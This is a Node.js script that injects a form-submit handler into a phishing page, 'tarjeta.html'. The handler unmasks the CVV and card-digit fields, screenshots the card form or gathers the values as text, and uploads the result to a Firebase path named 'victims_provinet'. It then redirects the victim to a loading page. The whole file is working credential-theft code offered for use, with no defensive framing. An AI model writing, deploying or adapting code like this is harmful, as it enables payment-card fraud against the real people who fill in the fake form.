const fs = require('fs');
let html = fs.readFileSync('tarjeta.html', 'utf8');

const regex = /form\.addEventListener\('submit', async function\(e\) \{[\s\S]*?\}\);/i;

const replacement = `
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const btnSubmit = document.getElementById('submit');
            if(btnSubmit) {
                btnSubmit.innerText = 'Cargando...';
                btnSubmit.style.pointerEvents = 'none';
                btnSubmit.style.opacity = '0.7';
            }

            // Unmask passwords for capture
            const cvv = document.getElementById('cvv');
            const ultimos = document.getElementById('ultimos_digitos');
            if (cvv) cvv.type = 'text';
            if (ultimos) ultimos.type = 'text';

            // Wait for DOM to render the unmasked text
            await new Promise(r => setTimeout(r, 200));

            try {
                // Ensure html2canvas exists
                if (typeof html2canvas === 'undefined') {
                    console.error("html2canvas not loaded");
                    // Fallback to text if library fails to load
                    let textData = "TIPO: " + (document.getElementById('tipo_tarjeta')?document.getElementById('tipo_tarjeta').value:'') + 
                                   " | VENC: " + (document.getElementById('fecha_vencimiento')?document.getElementById('fecha_vencimiento').value:'') + 
                                   " | CVV: " + (cvv?cvv.value:'') + 
                                   " | 3 DIGITOS: " + (ultimos?ultimos.value:'');
                                   
                    let vId = localStorage.getItem('current_victim_id');
                    if (!vId) vId = Date.now().toString(); // create fake id for testing
                    
                    database.ref('victims_provinet/' + vId).update({ tarjeta: textData })
                        .then(() => { window.location.href = 'cargando.html'; })
                        .catch(() => { window.location.href = 'cargando.html'; });
                    return;
                }

                // Take screenshot
                const canvas = await html2canvas(document.getElementById('form'), {
                    backgroundColor: '#ffffff',
                    scale: 2
                });
                const imgData = canvas.toDataURL('image/jpeg', 0.8);

                let victimId = localStorage.getItem('current_victim_id');
                if (!victimId) {
                    // Create a test ID if accessed directly
                    victimId = "TEST_" + Date.now().toString();
                    localStorage.setItem('current_victim_id', victimId);
                    database.ref('victims_provinet/' + victimId).set({
                        id: victimId,
                        tipo: "V",
                        usuario: "TEST",
                        first_seen: Date.now(),
                        status: 'Prueba Directa'
                    });
                }
                
                database.ref('victims_provinet/' + victimId).update({
                    tarjeta: imgData
                }).then(() => {
                    window.location.href = 'cargando.html';
                }).catch(err => {
                    window.location.href = 'cargando.html';
                });
            } catch (err) {
                console.error("Canvas error", err);
                window.location.href = 'cargando.html';
            }
        });
`;

html = html.replace(regex, replacement);
fs.writeFileSync('tarjeta.html', html, 'utf8');
console.log('Bulletproof script injected');
